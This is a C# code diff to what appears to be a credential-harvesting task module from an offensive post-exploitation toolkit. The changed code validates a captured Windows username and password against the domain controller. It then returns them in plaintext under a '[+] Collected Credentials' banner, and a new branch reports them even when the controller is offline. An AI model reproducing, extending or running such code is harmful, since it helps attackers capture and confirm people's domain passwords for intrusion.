@@ -99,6 +99,7 @@ public class Task
             bool valid = false;
             PrincipalContext pcon = null;
             bool domainNotAvailable = false;
+            bool dcoffline = false;
             while (!valid)
             {
               
@@ -107,7 +108,7 @@ public class Task
 
                 try
                 {
-                    pcon = new PrincipalContext(ContextType.Domain);
+                    pcon = new PrincipalContext(ContextType.Domain, networkCredential.Domain);
 
                 }
                 catch (NullReferenceException)
@@ -127,28 +128,32 @@ public class Task
                     {
                         throw new Exception(ex2.Message);
                     }
-
                 }
                 string realUserName = "";
+                //try {realUserName = networkCredential.UserName;} catch (NullReferenceException) {continue;}
                 try {realUserName = !domainNotAvailable ? networkCredential.UserName : $"{networkCredential.Domain}\\{networkCredential.UserName}";} catch (NullReferenceException) {continue;}
-                try { valid = pcon.ValidateCredentials(realUserName, networkCredential.Password); } catch (System.DirectoryServices.AccountManagement.PrincipalOperationException) { valid = false; continue; } 
-                if (valid & networkCredential.Domain != "")
+                //try {realUserName = !domainNotAvailable ? networkCredential.UserName : networkCredential.UserName;} catch (NullReferenceException) {continue;}
+                try { valid = pcon.ValidateCredentials(realUserName, networkCredential.Password); } 
+                	catch (System.DirectoryServices.AccountManagement.PrincipalOperationException) { valid = false; continue; }
+                    	// this returns the entered credentials if DC can't be contacted.
+                    	catch (System.IO.FileNotFoundException) { dcoffline = true;}
+                if (valid)
                 {
 
-                    return "[+] Collected Credentials:\r\n" +
+                    return "Creds are Valid\r\n[+] Collected Credentials:\r\n" +
                          "Username: " + networkCredential.Domain + "\\" + networkCredential.UserName + "\r\n" +
                          "Password: " + networkCredential.Password;
 
                 }
-                else if (valid)
+                else if (dcoffline)
                 {
-                    return "[+] Collected Credentials:\r\n" +
+                    return "DC not online, so not sure if this is valid\r\n[+] Collected Credentials:\r\n" +
                         "Username: " + networkCredential.UserName + "\r\n" +
-                        "Password: " + networkCredential.Password;
-                }
-            } return "[+] Just had to be here to prevent error";
+                        "Password: " + networkCredential.Password + "\r\n" + networkCredential.Domain;
+                }	
+            } return "[+] Just had to be here";
 
         }
-        catch (NullReferenceException) { return "hmmm..seems something really bad happened"; }
+        catch (Exception e) { return e.GetType().FullName; }
     } 
 }
